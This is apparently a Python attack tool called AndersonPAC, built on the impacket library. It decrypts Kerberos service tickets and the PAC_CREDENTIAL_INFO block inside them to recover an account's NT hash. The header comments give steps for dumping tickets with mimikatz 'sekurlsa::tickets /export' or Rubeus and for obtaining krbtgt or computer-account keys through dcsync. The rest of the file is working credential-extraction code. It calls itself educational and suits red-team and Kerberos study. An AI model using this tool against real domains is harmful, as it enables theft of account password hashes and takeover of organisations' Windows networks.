#!/usr/bin/env python
# NOTE: this script was created for educational purposes to assist learning about kerberos tickets.  
#   Likely to have a few bugs that cause it to fail to decrypt some TGT or Service tickets.
#
# Recommended Instructions:
#   Obtain valid kerberos tickets using Rubeus or mimikatz "sekurlsa::tickets /export"
#   Optionally convert tickets to ccache format using kekeo "misc::convert ccache <ticketName.kirbi>"
#   Obtain appropriate aes256 key using dcsync (krbtgt for TGT or usually target computer account for Service Ticket)
#   Run this script to decrypt:
#     ./decryptKerbTicket.py -k 5c7ee0b8f0ffeedbeefdeadbeeff1eefc7d313620feedbeefdeadbeefafd601e -t ./Administrator@TESTLAB.LOCAL_krbtgt~TESTLAB.LOCAL@TESTLAB.LOCAL.ccaches 
#     ./decryptKerbTicket.py -k 64aed4bbdac65342c94cf8db9522ca5a73a3f3fb4b6fdd4b7b332a6e98d10760 -t ./ASK_cifs-box1.testlab.local.kirbi

import struct, argparse, sys
from binascii import unhexlify,hexlify, b2a_hex
import base64

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table, _AES256CTS, _RC4
from impacket.krb5.constants import EncryptionTypes
from impacket.krb5.pac import PACTYPE, VALIDATION_INFO, PAC_CREDENTIAL_INFO, SECPKG_SUPPLEMENTAL_CRED, \
     NTLM_SUPPLEMENTAL_CREDENTIAL, SECPKG_SUPPLEMENTAL_CRED_ARRAY, PAC_CREDENTIAL_DATA

from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, KRB_CRED, EncKrbCredPart
from impacket.krb5.ccache import CCache, Header, Credential, KeyBlock, Times, CountedOctetString, Principal, Ticket
from impacket.krb5 import types

# KrbCredCCache Class copied from: https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/krbcredccache.py 
# Needed to support kirbi2ccache() function
class KrbCredCCache(CCache):
    """
    This is just the impacket ccache, but with an extra function to create it from
    a Krb Cred Ticket and ticket data
    """
    def fromKrbCredTicket(self, ticket, ticketdata):
        self.headers = []
        header = Header()
        header['tag'] = 1
        header['taglen'] = 8
        header['tagdata'] = '\xff\xff\xff\xff\x00\x00\x00\x00'
        self.headers.append(header)


        tmpPrincipal = types.Principal()
        tmpPrincipal.from_asn1(ticketdata, 'prealm', 'pname')
        self.principal = Principal()
        self.principal.fromPrincipal(tmpPrincipal)

        encASRepPart = ticketdata

        credential = Credential()
        server = types.Principal()
        server.from_asn1(encASRepPart, 'srealm', 'sname')
        tmpServer = Principal()
        tmpServer.fromPrincipal(server)

        credential['client'] = self.principal
        credential['server'] = tmpServer
        credential['is_skey'] = 0

        credential['key'] = KeyBlock()
        credential['key']['keytype'] = int(encASRepPart['key']['keytype'])
        credential['key']['keyvalue'] = str(encASRepPart['key']['keyvalue'])
        credential['key']['keylen'] = len(credential['key']['keyvalue'])

        credential['time'] = Times()
        credential['time']['authtime'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['starttime']))
        credential['time']['starttime'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['starttime']))
        credential['time']['endtime'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['endtime']))
        credential['time']['renew_till'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['renew-till']))

        flags = self.reverseFlags(encASRepPart['flags'])
        credential['tktflags'] = flags

        credential['num_address'] = 0
        credential.ticket = CountedOctetString()
        credential.ticket['data'] = encoder.encode(ticket.clone(tagSet=Ticket.tagSet, cloneValueFlag=True))
        credential.ticket['length'] = len(credential.ticket['data'])
        credential.secondTicket = CountedOctetString()
        credential.secondTicket['data'] = ''
        credential.secondTicket['length'] = 0
        self.credentials.append(credential)

def p(x):
    return struct.pack('<L',x)

# https://msdn.microsoft.com/en-us/library/cc237954.aspx
def processPacInfoBuffer(pacData):
    dword = 8 # 4 bytes
    bufferList = []
    for i in range(0,32,dword):
        bufferStr = pacData[i:i+dword]
        bufferInt = int(bufferStr,16)
        bufferStr = hexlify(p(bufferInt))
        bufferInt = int(bufferStr,16)
        bufferList.append(bufferInt)
    return bufferList

def processTicket(ticket, key, verbose):
    ticketCreds = ticket.credentials[0]

    if verbose:
        print("\n\n[+] ENCRYPTED TICKET:")
    cipherText = str(ticketCreds.ticket)

    # TGT/TGS tickets contain the SPN that they are applied to (e.g. krbtgt/testlab.local@testlab.local), which will change the location of the PAC 
    spnLength = len(ticketCreds['server'].realm['data'])

    for i in ticketCreds['server'].toPrincipal().components:
        spnLength += len(i)
    
    decryptOffset = 128 + (2 * spnLength) # 2x is due to hexlified formatting
    encryptedTicket = hexlify(cipherText)[decryptOffset:]
    if verbose:
        print(encryptedTicket)
    else:
        print("\tClient: " + ticketCreds['client'].prettyPrint())
        print("\tServer: " + ticketCreds['server'].prettyPrint())

    if verbose:
        print("\n\n[+] DECRYPTED TICKET (still encoded)")
    else:
        print("[+] DECRYPTING TICKET")
    encType = ticketCreds['key']['keytype'] # determine encryption type that ticket is using

    # create encryption key based on type that ticket uses
    try:
        if encType == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            key = Key(encType, unhexlify(key))
        elif encType == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            key = Key(encType, unhexlify(key))
        elif encType == EncryptionTypes.rc4_hmac.value:
            key = Key(encType, unhexlify(key))
        else:
            raise Exception('Unsupported enctype 0x%x' % encType)
    except Exception as e:
        print("[!] Error creating encryption key\n[!] Make sure you specified the correct key, your ticket is using type: " + str(encType))
        print(e)
        sys.exit(1)
    cipher = _enctype_table[encType]

    try:
        decryptedText = cipher.decrypt(key, 2, str(unhexlify(encryptedTicket)))
    except Exception as e:
        print("[!] Error \"" + str(e) + "\" occured while decrypting ticket.  Attempting quick fix...")
        try:
            encryptedTicket = hexlify(cipherText)[decryptOffset+4:]
            decryptedText = cipher.decrypt(key, 2, str(unhexlify(encryptedTicket)))
            print("[+] Decryption successful, quick fix worked")
        except Exception as e2:
            print("[!] Error \"" + str(e2) + "\" Quick fix failed. Make sure that correct decryption key is specified")
            sys.exit(1)

    if verbose:
        print(hexlify(decryptedText))

    decodedEncTicketPart = decoder.decode(decryptedText)[0]
    if verbose:
        print("\n\n[+] DECODED TICKET:")
        print(decodedEncTicketPart)

    pacData = decodedEncTicketPart['field-9'][0]['field-1']
    
    decAuthData = decoder.decode(pacData)[0][0]['field-1']
    
    pacBuffers = PACTYPE(str(decAuthData))
    pacBuffer = pacBuffers['Buffers']
    num_of_buffers = pacBuffers['cBuffers']
    pacBufferHex = hexlify(pacBuffer)
    
    #Iterate On all the PAC_INFO_BUFFERS, and find the PAC_CREDENTIAL_INFO
    for i in range(0,num_of_buffers):
        pacInfoList = processPacInfoBuffer(pacBufferHex)
        authDataType = pacInfoList[0]
        authDataLength = pacInfoList[1]
        authDataOffset = pacInfoList[2]
        authDataEnd = authDataLength*2

        # Offset - PACTYPE Size - PAC_INFO_BUFFERS Size        
        offsetStart = authDataOffset*2 - 16 - i*32
        authDataHex = pacBufferHex[offsetStart:offsetStart+authDataEnd]

        if (authDataType == 2):
            print("[+] Found the PAC_CREDENTIAL_INFO")
            print("     ulType: " + str(authDataType))
            print("     cbBufferSize: " + str(authDataLength) + " bytes")
            print("     Offset: " + str(authDataOffset) + " bytes\n")
            break
        pacBufferHex = pacBufferHex[32:]

    return authDataHex

# kirbi2ccache function copied from https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py
def kirbi2ccache(kirbifile):
    with open(kirbifile, 'rb') as infile:
        data = infile.read()
    creds = decoder.decode(data, asn1Spec=KRB_CRED())[0]
    # This shouldn't be encrypted normally
    if creds['enc-part']['etype'] != 0:
        raise Exception('Ticket info is encrypted with cipher other than null')
    enc_part = decoder.decode(creds['enc-part']['cipher'], asn1Spec=EncKrbCredPart())[0]
    tinfo = enc_part['ticket-info']
    ccache = KrbCredCCache()
    # Enumerate all
    for i, tinfo in enumerate(tinfo):
        ccache.fromKrbCredTicket(creds['tickets'][i], tinfo)
    return ccache

def loadTicket(ticket, verbose):
    try:
        ticket = CCache.loadFile(ticket)
    except Exception as e:
        print("ERROR: unable to load specified ticket. Make sure it is in ccache format.")
        print(e)
        sys.exit(1)
    print("\n[+] TICKET LOADED SUCCESSFULLY")
    if verbose:
        print('')
        ticket.prettyPrint()

    return ticket

#This function gets the encryption type, the key, and decrypts the blob PAC_CREDENTIAL_DATA
def DecryptBlob(secret, enc_type, blob):
    rc4 = ""
    aes = ""
    try:
        if enc_type == 0x17:
            rc4 = _RC4
            print("[+] RC4 Encryption detected. trying to decrypt...\n")
            hkey = Key(EncryptionTypes.rc4_hmac.value, base64.b64decode(secret))
            decrypted = rc4.decrypt(hkey, 16, str(blob))
        elif enc_type == 0x12:
             aes = _AES256CTS
             print("[+] AES256 Encryption detected. trying to decrypt...\n")
             hkey = Key(EncryptionTypes.aes256_cts_hmac_sha1_96.value, base64.b64decode(secret))
             decrypted = aes.decrypt(hkey, 16, str(blob))
        else:
            "[-] Encryption method not supported"
    except:
        print("[-] Problem Decrypting. tries to bruteforce the num of rounds")
        for i in range(0,1000):
            try:
                if rc4:
                    decrypted = rc4.decrypt(hkey, i, str(blob))
                else:
                    decrypted = aes.decrypt(hkey, i, str(blob))
                print (i)
            except:
                pass
    
    nthash = hexlify(decrypted)[-40:-8]

    print("[+] Great success! got the NTHash: {}".format(nthash))

def parseArgs():
    parser = argparse.ArgumentParser(add_help=True, description="Anderson PAC. Gets service ticket, Computer Account password and as-replay key. \
    Decrypting and returning the wanted nthash")
    parser.add_argument('-t','--ticket', required=True, help='location of kerberos ticket file (ccache or kirbi format)')
    parser.add_argument('-k','--key', required = True, action="store", help='decryption key (ntlm/aes128/aes256)')
    parser.add_argument('-r','--ASReplay', required = True, action="store", help='AS-Replay key from rubeus askTGT, encoded in base64')
    parser.add_argument('-v','--verbose', action='store_true', help='Increase verbosity')


    if len(sys.argv) > 8 or len(sys.argv) < 7:
        parser.print_help(sys.stderr)
        print("\nExample:\n\t./AndersonPAC.py -k 5c7ee0b8f0ffeedbeefdeadbeeff1eefc7d313620feedbeefdeadbeefafd601e -t host_1803pc.kirbi -r Wf+ltNtt8e1Y8jlgiQ9Kag==")
        sys.exit(1)

    args = parser.parse_args()
    return args

def main():
    args = parseArgs()
    if (args.ticket.upper().endswith(".KIRBI")):
        ticket = kirbi2ccache(args.ticket)
    else:
        ticket = loadTicket(args.ticket, args.verbose)
    CredDataHex = processTicket(ticket, args.key, args.verbose)

    #Parse the PAC_CREDENTIAL_INFO struct to encrypted blob and enc-type. then decrypt it.
    pac_creds = PAC_CREDENTIAL_INFO(str(unhexlify(CredDataHex)))
    enc_type = pac_creds['EncryptionType']
    blob = pac_creds['SerializedData']

    #Decrypt the blob with the proper enc method (RC4 or AES256)
    DecryptBlob(args.ASReplay, enc_type, blob)

if __name__ == '__main__':
    main()
